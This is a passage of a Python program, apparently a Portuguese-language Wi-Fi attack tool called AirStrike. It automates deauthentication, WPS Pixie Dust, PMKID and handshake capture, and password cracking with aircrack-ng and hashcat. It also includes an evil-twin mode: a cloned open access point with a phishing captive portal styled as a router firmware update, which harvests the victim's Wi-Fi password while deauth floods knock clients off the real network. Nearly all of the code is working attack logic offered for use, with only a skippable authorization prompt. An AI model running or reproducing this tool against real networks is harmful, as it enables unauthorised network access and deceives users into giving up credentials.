                if extr and (extr[0] or extr[1]):
                    got = extr
                    break
            time.sleep(2)
    except KeyboardInterrupt:
        print()
        warn("PMKID dedicado interrompido pelo usuario")
    finally:
        try:
            proc.kill()
        except Exception:
            pass
    if got[0] or got[1]:
        ok(f"hash obtido sem deauth: {got[0]} PMKID e {got[1]} EAPOL -> {hash_file}")
    return got


def testa_senha_no_cap(cap_file, bssid, senha):
    """Confere uma senha candidata contra o handshake do .cap (aircrack)."""
    if not os.path.isfile(cap_file):
        return False
    fd, lista = tempfile.mkstemp(prefix="airstrike_cand_", suffix=".txt")
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(senha + "\n")
        rc, out = run(["aircrack-ng", "-a2", "-b", bssid, "-w", lista, cap_file],
                      timeout=60)
        return "key found" in out.lower()
    except (OSError, subprocess.TimeoutExpired):
        return False
    finally:
        try:
            os.remove(lista)
        except OSError:
            pass


PORTAL_NET_IP = "192.168.87.1"
PORTAL_NET_IPS = ("192.168.87.10", "192.168.87.200")


def portal_pagina(essid):
    """Pagina do portal cativo (neutra, no estilo atualizacao de firmware)."""
    nome = (essid or "Wi-Fi").replace("<", "&lt;").replace(">", "&gt;")
    return """<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Atualizacao de rede</title><style>
body{font-family:sans-serif;background:#f2f4f7;display:flex;min-height:100vh;
margin:0;align-items:center;justify-content:center}
.cx{background:#fff;max-width:340px;padding:28px;border-radius:10px;
box-shadow:0 2px 12px rgba(0,0,0,.15);text-align:center}
.cx h1{font-size:18px;margin:0 0 6px}.cx p{font-size:13px;color:#555}
input{width:100%;padding:10px;margin:12px 0;border:1px solid #ccc;border-radius:6px;
box-sizing:border-box;font-size:14px}
button{width:100%;padding:10px;border:0;border-radius:6px;background:#0a63c9;
color:#fff;font-size:14px;cursor:pointer}</style></head><body><div class="cx">
<h1>Atualizacao do roteador</h1>
<p><b>__ESSID__</b><br>Sua conexao sera restabelecida ao final da atualizacao.<br>
Confirme a senha do Wi-Fi para continuar.</p>
<form method="POST" action="/">
<input type="password" name="senha" placeholder="Senha do Wi-Fi" required>
<button type="submit">Continuar</button></form>
<p style="font-size:11px;color:#999">Isso nao afeta suas configuracoes</p>
</div></body></html>""".replace("__ESSID__", nome)


def portal_servidor(porta, essid, candidatos_path):
    """Sobe o servidor HTTP do portal; devolve o objeto HTTPServer."""
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    pagina = portal_pagina(essid)
    ok_page = """<!doctype html><html lang="pt-BR"><head><meta charset="utf-8">
<meta http-equiv="refresh" content="5"><title>Atualizando</title></head>
<body style="font-family:sans-serif;text-align:center;padding-top:15vh">
<h3>Atualizando...</h3><p> nao desligue o aparelho. Voce sera reconectado em instantes.</p>
</body></html>"""

    class Handler(BaseHTTPRequestHandler):
        def _manda(self, corpo, code=200):
            data = corpo.encode("utf-8")
            self.send_response(code)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def do_GET(self):
            self._manda(pagina)

        def do_POST(self):
            try:
                tamanho = int(self.headers.get("Content-Length") or 0)
                corpo = self.rfile.read(tamanho).decode("utf-8", "replace")
                campos = urllib.parse.parse_qs(corpo)
                senha = (campos.get("senha") or campos.get("password") or [""])[0]
                if senha:
                    with open(candidatos_path, "a", encoding="utf-8") as fh:
                        fh.write(senha + "\n")
            except Exception:
                pass
            self._manda(ok_page)

        def log_message(self, *a):  # silencia o log padrao
            pass

    servidor = ThreadingHTTPServer(("0.0.0.0", porta), Handler)
    thread = threading.Thread(target=servidor.serve_forever, daemon=True)
    thread.start()
    return servidor


def eviltwin_attack(args, bssid, essid, channel, cap_file, iface_ap):
    """Evil twin com portal cativo (hostapd + dnsmasq + HTTP).

    Clona o ESSID como rede aberta, deautentica os clientes do AP real e
    valida cada senha digitada no portal contra o handshake ja capturado.
    Devolve a senha ou None.
    """
    iface_ap = iface_base(iface_ap)  # aceita chegar em modo monitor (wlan1mon)
    if not shutil.which("hostapd") or not shutil.which("dnsmasq"):
        err("hostapd e dnsmasq sao obrigatorios no evil twin "
            "(sudo apt install hostapd dnsmasq)")
        return None
    pasta = os.path.join(args.out, "eviltwin_%s" % time.strftime("%Y%m%d_%H%M%S"))
    os.makedirs(pasta, exist_ok=True)
    conf_ap = os.path.join(pasta, "hostapd.conf")
    conf_dns = os.path.join(pasta, "dnsmasq.conf")
    candidatos = os.path.join(pasta, "candidatos.txt")
    log_ap = os.path.join(pasta, "hostapd.log")
    log_dns = os.path.join(pasta, "dnsmasq.log")

    essid_safe = (essid or "Wi-Fi")[:32]
    hw_mode = "a" if int(channel) > 14 else "g"
    with open(conf_ap, "w", encoding="utf-8") as fh:
        fh.write(f"interface={iface_ap}\ndriver=nl80211\nssid={essid_safe}\n"
                 f"channel={channel}\nhw_mode={hw_mode}\nauth_algs=1\n"
                 f"ignore_broadcast_ssid=0\n")
    with open(conf_dns, "w", encoding="utf-8") as fh:
        fh.write(f"interface={iface_ap}\nbind-interfaces\n"
                 f"dhcp-range={PORTAL_NET_IPS[0]},{PORTAL_NET_IPS[1]},12h\n"
                 f"dhcp-option=3,{PORTAL_NET_IP}\ndhcp-option=6,{PORTAL_NET_IP}\n"
                 f"address=/#/{PORTAL_NET_IP}\nno-resolv\n")

    # 1) AP: tira o monitor da antena que hospeda o AP e sobe o hostapd
    info(f"preparando AP clonado '{essid_safe}' na antena {iface_ap} "
         f"(canal {channel})")
    run(["airmon-ng", "stop", iface_ap if iface_ap.endswith("mon")
         else iface_ap + "mon"], timeout=30)
    run(["ip", "addr", "flush", "dev", iface_ap])
    run(["ip", "addr", "add", PORTAL_NET_IP + "/24", "dev", iface_ap])
    run(["ip", "link", "set", iface_ap, "up"])
    proc_ap = subprocess.Popen(
        ["hostapd", "-K", conf_ap],
        stdout=open(log_ap, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL)
    proc_dns = subprocess.Popen(
        ["dnsmasq", "-C", conf_dns, "-d"],
        stdout=open(log_dns, "w"), stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL)
    # espera o AP subir
    ap_no_ar = False
    for _ in range(15):
        if proc_ap.poll() is not None:
            break
        rc, out = run(["iw", "dev", iface_ap, "info"], timeout=10)
        if "type AP" in out:
            ap_no_ar = True
            break
        time.sleep(1)
    if not ap_no_ar:
        err("hostapd nao subiu o AP clonado; veja " + log_ap)
        for p in (proc_ap, proc_dns):
            try:
                p.kill()
            except Exception:
                pass
        return None
    ok(f"AP clonado no ar: {essid_safe} (portal em http://{PORTAL_NET_IP}:{args.portal_port})")

    # 2) Deauth: monitor virtual na mesma antena; se o driver recusar,
    #    avisa (o portal funciona mesmo assim para quem conectar)
    deauth_iface = None
    rc, phy_out = run(["iw", "dev", iface_ap, "info"], timeout=10)
    mphy = re.search(r"phy\d+", phy_out)
    if mphy:
        rc, _ = run(["iw", "phy", mphy.group(0), "interface",
                     "add", iface_ap + "mon", "type", "monitor"], timeout=10)
        if rc == 0:
            run(["ip", "link", "set", iface_ap + "mon", "up"])
            deauth_iface = iface_ap + "mon"
    if deauth_iface:
        ok(f"deauth ativo pela mesma antena ({deauth_iface})")
    else:
        warn("driver recusou monitor virtual junto do AP: sem deauth automatico")
        warn("os clientes so chegam ao portal se se conectarem sozinhos ao clone")

    # 3) Portal + deauth em loop + conferencia das candidatas
    servidor = portal_servidor(args.portal_port, essid_safe, candidatos)
    info("portal cativo ativo; deautenticando clientes do AP real em loop")
    info(f"aguardando senha digitada no portal (ate {args.portal_time}s; Ctrl+C encerra)")
    testadas = set()
    chave = None
    prazo = time.time() + max(60, args.portal_time)
    rodada = 0
    try:
        while time.time() < prazo:
            # deauth periodica do AP real
            if deauth_iface and rodada % 1 == 0:
                run(["aireplay-ng", "-0", "5", "-a", bssid, deauth_iface],
                    timeout=30)
            rodada += 1
            if os.path.isfile(candidatos):
                try:
                    with open(candidatos, "r", encoding="utf-8",
                              errors="replace") as fh:
                        linhas = [l.strip() for l in fh if l.strip()]
                except OSError:
                    linhas = []
                for cand in linhas:
                    if cand in testadas:
                        continue
                    testadas.add(cand)
                    info(f"portal recebeu senha candidata ({len(cand)} chars); conferindo no handshake...")
                    if testa_senha_no_cap(cap_file, bssid, cand):
                        chave = cand
                        break
                if chave:
                    break
            time.sleep(max(5, args.deauth_interval))
    except KeyboardInterrupt:
        print()
        warn("portal encerrado pelo usuario")
    finally:
        servidor.shutdown()
        for p in (proc_ap, proc_dns):
            try:
                p.kill()
            except Exception:
                pass
        if deauth_iface:
            run(["iw", "dev", deauth_iface, "del"], timeout=10)
        run(["ip", "addr", "flush", "dev", iface_ap])
        info(f"arquivos do evil twin em {pasta}")
    return chave


# ---------------------------------------------------------------------------
# Principal
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        description="AirStrike: auditoria automatizada de redes Wi-Fi "
                    "(airmon/airodump/aireplay/aircrack + PMKID via hcxtools/hashcat). "
                    "Use somente com autorizacao.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--iface", help="interface wireless (padrao: auto-detectada)")
    p.add_argument("--iface-inject", dest="iface_inject",
                   help="adaptador so para injecao/deauth (2a antena, estilo wifite; "
                        "padrao: o mesmo da captura)")
    p.add_argument("--monitor", dest="monitor", help="interface ja em modo monitor (pula o setup)")
    p.add_argument("--scan-time", type=int, default=15, help="segundos de varredura")
    p.add_argument("--bssid", help="BSSID do alvo (pula o menu interativo)")
    p.add_argument("--channel", help="canal do alvo (usado com --bssid se a varredura nao achar)")
    p.add_argument("--essid", help="nome (ESSID) do alvo, apenas para registro")
    p.add_argument("--wordlist", default=DEFAULT_WORDLIST, help="lista de senhas")
    p.add_argument("--deauth", type=int, default=10, help="pacotes de desauth por rodada (0 = desativa)")
    p.add_argument("--deauth-interval", type=int, default=15, help="segundos entre rodadas de deauth")
    p.add_argument("--capture-time", type=int, default=180, help="tempo maximo de captura (s)")
    p.add_argument("--iv-target", type=int, default=20000, help="IVs minimos para o ataque WEP")
    p.add_argument("--cracker", choices=("auto", "aircrack", "hashcat"), default="auto",
                   help="quebrador WPA (auto: hashcat se houver hash PMKID/EAPOL extraido)")
    p.add_argument("--hashcat-args", default="",
                   help="argumentos extras do hashcat entre aspas, ex: '--force -D 1'")
    p.add_argument("--masks", default="numeric8",
                   help="frentes de mascara: presets numeric6/7/8/9/10, factory, alnum8 "
                        "ou mascaras crus (?d?d?l?l) separadas por virgula")
    p.add_argument("--increment", action="store_true",
                   help="adiciona a frente de incremento numerico (1 ate 8 digitos)")
    p.add_argument("--rules",
                   help="regras do hashcat, ex: /usr/share/hashcat/rules/best64.rule")
    p.add_argument("--pmkid-time", type=int, default=45,
                   help="segundos de PMKID dedicado (hcxdumptool, sem deauth) "
                        "antes da captura dirigida (0 = desativa)")
    p.add_argument("--no-wps", action="store_true",
                   help="nao tenta WPS Pixie Dust (reaver/bully) no alvo")
    p.add_argument("--pixie-time", type=int, default=90,
                   help="tempo maximo do Pixie Dust em segundos (0 = desativa)")
    p.add_argument("--eviltwin", action="store_true",
                   help="apos capturar o handshake, sobe AP clonado com portal "
                        "cativo (hostapd + dnsmasq) e valida as senhas digitadas")
    p.add_argument("--portal-port", type=int, default=80,
                   help="porta do portal cativo do evil twin")
    p.add_argument("--portal-time", type=int, default=900,
                   help="tempo maximo do portal cativo em segundos")
    p.add_argument("--hspeed", type=float, default=150000,
                   help="hashes/s usados na estimativa de tempo (padrao = GPU intermediaria)")
    p.add_argument("--bench", action="store_true",
                   help="mede a velocidade real do hashcat antes de estimar")
    p.add_argument("--out", default="captures", help="pasta para capturas e resultados")
    p.add_argument("--crack", metavar="ARQUIVO",
                   help="quebra sobre captura ja feita, sem capturar de novo: um .cap "
                        "da sessao (ex: captures/captura_20261015_115942-01.cap), o "
                        "prefixo da sessao, ou um .22000 direto")
    p.add_argument("--no-crack", action="store_true", help="para apos a captura, sem testar senhas")
    p.add_argument("--keep", action="store_true",
                   help="nao restaura nada: mantem o monitor ativo e a rede morta ao final")
    p.add_argument("--yes", "-y", action="store_true", help="pula o aviso de autorizacao")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)

    if os.geteuid() != 0:
        err("execute com sudo: sudo airstrike")
        sys.exit(1)

    print_banner()

    require_tools()
    confirm_authorization(args)

    os.makedirs(args.out, exist_ok=True)

    # 0) Quebrar sobre uma captura ja feita? ------------------------------
    # --crack <arquivo> escolhe direto; no terminal interativo, pergunta (s/n).
    arquivo = args.crack
    if arquivo is None and sys.stdin.isatty():
        caps = list_caps(args.out)
        if caps:
            info(f"ja existem {len(caps)} captura(s) em {args.out}/")
            try:
                resp = input("Rodar a quebra sobre uma captura existente? "
                             "(s = escolher captura / n = nova captura) [n]: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                resp = ""
            if resp in ("s", "sim", "y", "yes"):
                arquivo = escolher_captura(caps)
                if arquivo is None:
                    info("nenhuma captura escolhida; seguindo para nova captura")
    if arquivo:
        try:
            return crack_captura_existente(arquivo, args)
        except KeyboardInterrupt:
            print()
            warn("interrompido pelo usuario")
            return 130

    escolher_adaptadores(args)  # estilo wifite: pergunta qual adaptador usar

    adapter = Adapter(args.iface)
    cap = {"proc": None, "prefix": None}
    found_key = None
    target = None
    prefix = None
    inject_iface = None

    try:
        # 1) Modo monitor --------------------------------------------------
        if args.monitor:
            adapter.monitor = args.monitor
            ifaces = list_ifaces_with_type()
            if ifaces and ifaces.get(adapter.monitor) != "monitor":
                warn(f"{adapter.monitor} nao parece estar em modo monitor (tipo: {ifaces.get(adapter.monitor)})")
            ok(f"usando interface em modo monitor: {adapter.monitor}")
        else:
            adapter.setup()
            ok(f"modo monitor ativo em {adapter.monitor}")

        # 2) Varredura -----------------------------------------------------
        redes = scan_networks(adapter.monitor, max(5, args.scan_time), args.out)
        if not redes and not adapter.alive():
            warn("o adaptador caiu durante a varredura; religando automaticamente...")
            if adapter.recover():
                redes = scan_networks(adapter.monitor, max(5, args.scan_time), args.out)
        print_networks(redes)
        if args.scan_time == 0 and not (args.bssid and args.channel):
            err("sem varredura: informe --bssid e --channel")
            sys.exit(1)

        # 3) Alvo ----------------------------------------------------------
        target = choose_target(redes, args)
        if target is None:
            info("nenhum alvo selecionado. Encerrando.")
            return 0
        channel = target.get("channel") or args.channel
        if not channel or not str(channel).isdigit():
            err("canal do alvo desconhecido; informe --channel")
            sys.exit(1)
        bssid = target["bssid"]
        essid = target.get("essid") or (args.essid or "")
        enc = (target.get("privacy") or "").upper()
        ok(f"alvo: {essid or '(oculta)'} [{bssid}] canal {channel} ({enc or '?'})")

        if "SAE" in enc or "WPA3" in enc:
            warn("rede WPA3/SAE: nao sera quebrada por wordlist (exige PMF desativada)")
        if "MGT" in (target.get("auth") or "").upper():
            warn("rede enterprise (802.1X): a wordlist nao se aplica")

        # 4) Captura dirigida ----------------------------------------------
        # A rede so morre AQUI, na hora da captura: o NetworkManager e o
        # wpa_supplicant atrapalham a captura (trocam de canal, reconectam).
        info("matando processos de rede para a captura (airmon-ng check kill)")
        run(["airmon-ng", "check", "kill"])
        adapter.matou_processos = True

        # Adaptador de injecao (estilo wifite: pode ser uma 2a antena) e
        # teste de injecao — sem injecao o deauth nao funciona.
        inject_iface = setup_injection(args, adapter, channel)
        test_injection(inject_iface, bssid=bssid, essid=essid or None, channel=channel)

        # 4a) WPS Pixie Dust (reaver/bully): quebra instantanea se WPS aberto
        got = None
        hash_pronto = False
        pmkid_file_pronto = None
        if "WEP" not in enc and not args.no_wps and args.pixie_time > 0:
            estado_wps = wps_probe(adapter.monitor, bssid, channel)
            if estado_wps is None:
                info("WPS ausente ou indeterminado no alvo (wash)")
            elif estado_wps == "locked":
                info("WPS presente mas TRAVADO no alvo; pixie dust nao se aplica")
            else:
                ok("WPS ABERTO no alvo: tentando Pixie Dust...")
                pin, senha = wps_pixie(adapter.monitor, bssid, channel,
                                       max(30, args.pixie_time))
                if senha:
                    ok(paint("CHAVE ENCONTRADA (Pixie Dust): %s" % senha,
                             Color.BOLD + Color.GREEN))
                    save_result(args.out, bssid, essid, senha)
                    return 0
                if pin:
                    warn(f"Pixie Dust revelou o PIN WPS ({pin}), mas nao a senha;")
                    warn(f"  continue com: reaver -i {adapter.monitor} -b {bssid} -p {pin}")
                else:
                    warn("Pixie Dust sem resultado (roteador corrigido ou sem vunerabilidade)")

        # 4b) PMKID dedicado (hcxdumptool): hash sem deauth e sem cliente
        if "WEP" not in enc and args.pmkid_time > 0:
            prefix_pmkid = os.path.join(args.out,
                                        "pmkid_" + bssid.replace(":", "").lower())
            n_pmkid, n_eapol = pmkid_dedicado(adapter.monitor, bssid, channel,
                                              max(15, args.pmkid_time), prefix_pmkid)
            if n_pmkid or n_eapol:
                hash_pronto = True
                pmkid_file_pronto = prefix_pmkid + ".22000"
                got = "pmkid"

        if hash_pronto:
            ok("hash obtido sem deauth: pulando a captura dirigida")
            prefix = pmkid_file_pronto[:-6]
            cap_file = None
        else:
            log_path = os.path.join(args.out, "airodump.log")
            cap["proc"], cap["prefix"] = start_capture(adapter.monitor, bssid, channel,
                                                       args.out, log_path)
            if cap["proc"] is None:
                err("nao foi possivel iniciar a captura; verifique o adaptador e tente de novo")
                return 1
            prefix = cap["prefix"]
            cap_file = prefix + "-01.cap"

            deauth_count = args.deauth
            if deauth_count > 0:
                info("etapa de teste de desconexao (aireplay-ng) habilitada")
            else:
                info("teste de desconexao desabilitado (--deauth 0)")

            got = wait_handshake(adapter, cap, bssid, channel, args.out, log_path,
                                 capture_time=max(30, args.capture_time),
                                 deauth_count=deauth_count,
                                 deauth_interval=max(5, args.deauth_interval),
                                 iv_target=args.iv_target,
                                 inject_iface=inject_iface)
            prefix = cap["prefix"]  # pode ter mudado se o adaptador caiu e religou
            cap_file = prefix + "-01.cap"
            if got not in ("handshake", "pmkid", "ivs"):
                if "WEP" in enc:
                    warn("quantidade de IVs insuficiente; tentando mesmo assim")
                else:
                    warn("nem handshake nem PMKID confirmados durante a captura; tentando mesmo assim")
                    hs = has_handshake(cap_file, bssid)
                    if hs is False:
                        warn("sem handshake no .cap: aumente --capture-time e mantenha clientes conectados")
                        warn("se os aparelhos ficam na banda 5G, capture o BSSID de 5G:")
                        warn("  o deauth enviado no 2.4G nao alcana clientes da rede 5G")
                        warn("ou deixe o PMKID dedicado (hcxdumptool) trabalhar: --pmkid-time maior")

        # 5) Parar captura -------------------------------------------------
        _stop_process(cap["proc"])
        cap["proc"] = None
        time.sleep(1)

        # 5b) Evil twin (portal cativo), se pedido --------------------------
        # Antes de restaurar: o NetworkManager morto e o que deixa o clone
        # e o deauth funcionarem. O finally do main devolve tudo no fim.
        if args.eviltwin and "WEP" not in enc:
            if not cap_file or has_handshake(cap_file, bssid) is False:
                err("evil twin precisa de um handshake valido do alvo na captura; "
                    "rode de novo com --capture-time maior")
                return 1
            info("modo evil twin: AP clonado + portal cativo (senhas digitadas "
                 "sao conferidas contra o handshake capturado)")
            chave = eviltwin_attack(args, bssid, essid, channel, cap_file,
                                    inject_iface or adapter.monitor)
            if chave:
                ok(paint("CHAVE ENCONTRADA (evil twin): %s" % chave,
                         Color.BOLD + Color.GREEN))
                save_result(args.out, bssid, essid, chave)
                return 0
            warn("portal encerrado sem confirmar a senha; o handshake segue salvo")
            return 2

        # 6) Restaurar a interface e a internet -----------------------------
        # A quebra e offline: a rede volta ANTES dela, e nao so no fim.
        if not args.keep:
            info("captura encerrada; restaurando a interface e a internet...")
            monitores = [m for m in (adapter.monitor, inject_iface) if m]
            restore_setup(monitores, adapter.matou_processos)
            adapter.monitor = None
            adapter.matou_processos = False
            inject_iface = None

        if args.no_crack:
            info(f"captura salva em {cap_file} (quebra pulada por --no-crack)")
            return 0

        # 7) Lista de senhas ------------------------------------------------
        wordlist = prepare_wordlist(args.wordlist)
        if wordlist is None:
            if not sys.stdin.isatty():
                err("lista de senhas nao encontrada; informe com --wordlist")
                return 1
            try:
                resp = input("Caminho de outra lista de senhas (Enter para abortar a quebra): ").strip()
            except (EOFError, KeyboardInterrupt):
                resp = ""
            wordlist = resp if resp and os.path.isfile(resp) else None
        if wordlist is None:
            warn("sem lista de senhas; a captura ficou salva em %s" % cap_file)
            return 1

        # 8) Quebra ---------------------------------------------------------
        if "WEP" in enc:
            info("rede WEP: aircrack-ng tenta recuperar a chave sem wordlist")
            log_file = os.path.splitext(cap_file)[0] + "_chave.txt"
            proc = subprocess.Popen(["aircrack-ng", "-b", bssid, "-l", log_file, cap_file],
                                    stdin=subprocess.DEVNULL)
            proc.wait()
            found_key = None
            if os.path.isfile(log_file):
                with open(log_file, "r", encoding="utf-8", errors="replace") as fh:
                    found_key = fh.read().strip() or None
        else:
            pmkid_n = eapol_n = 0
            if hash_pronto and pmkid_file_pronto and os.path.isfile(pmkid_file_pronto):
                hash_file = pmkid_file_pronto
                pmkid_n, eapol_n = count_hashes_in_22000(hash_file, bssid)
                ok(f"hashes do PMKID dedicado: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")
            else:
                # Extrai PMKID/EAPOL no formato 22000 (hcxtools) para o hashcat
                hash_file = prefix + ".22000"
                extr = extract_22000(cap_file, hash_file, bssid)
                if extr is None:
                    warn("hcxpcapngtool ausente: ataque PMKID desativado (sudo apt install hcxtools)")
                else:
                    pmkid_n, eapol_n = extr
                    if pmkid_n or eapol_n:
                        ok(f"hashes extraidos: {pmkid_n} PMKID e {eapol_n} EAPOL -> {hash_file}")

            cracker = args.cracker
            if cracker == "auto":
                cracker = "hashcat" if (shutil.which("hashcat") and (pmkid_n or eapol_n)) else "aircrack"
            if cracker == "aircrack" and hash_pronto and not cap_file:
                err("o PMKID dedicado nao gera .cap: o aircrack-ng precisa do hashcat "
                    "(sudo apt install hashcat) ou da captura dirigida")
                return 1
            if cracker == "hashcat":
                if not shutil.which("hashcat"):
                    warn("hashcat ausente; usando aircrack-ng no .cap (sudo apt install hashcat)")
                    cracker = "aircrack"
                elif not (pmkid_n or eapol_n):
                    warn("nenhum hash PMKID/EAPOL extraido; usando aircrack-ng no .cap")
                    cracker = "aircrack"

            if cracker == "hashcat" and pmkid_n and not eapol_n:
                ok("sem 4-way handshake visivel; quebrando via PMKID")
            found_key = crack_pipeline(hash_file, cap_file, wordlist, bssid, cracker, args)

        if found_key:
            ok(paint("CHAVE ENCONTRADA: %s" % found_key, Color.BOLD + Color.GREEN))
            save_result(args.out, bssid, essid, found_key)
            return 0

        warn("chave nao encontrada com esta lista. Isso NAO significa que a rede e 'invulneravel':")
        warn("  - a senha pode nao estar na lista")
        warn("  - a captura pode nao ter os dados necessarios (tente --capture-time maior)")
        if cap_file:
            info(f"captura mantida em {cap_file} para novas tentativas:")
            info(f"  sudo airstrike --crack {cap_file}          # quebra sem recapturar")
            info(f"  sudo aircrack-ng -w {args.wordlist} -b {bssid} {cap_file}")
        if "WEP" not in enc and os.path.isfile(prefix + ".22000"):
            info(f"  hashcat -m 22000 {prefix}.22000 {args.wordlist}")
        return 2

    except KeyboardInterrupt:
        print()
        warn("interrompido pelo usuario")
        return 130
    finally:
        _stop_process(cap["proc"])
        if not args.keep:
            monitores = [m for m in (adapter.monitor, inject_iface) if m]
            if monitores or adapter.matou_processos:
                restore_setup(monitores, adapter.matou_processos)
        else:
            info("--keep: interface mantida como esta")


if __name__ == "__main__":
    sys.exit(main())
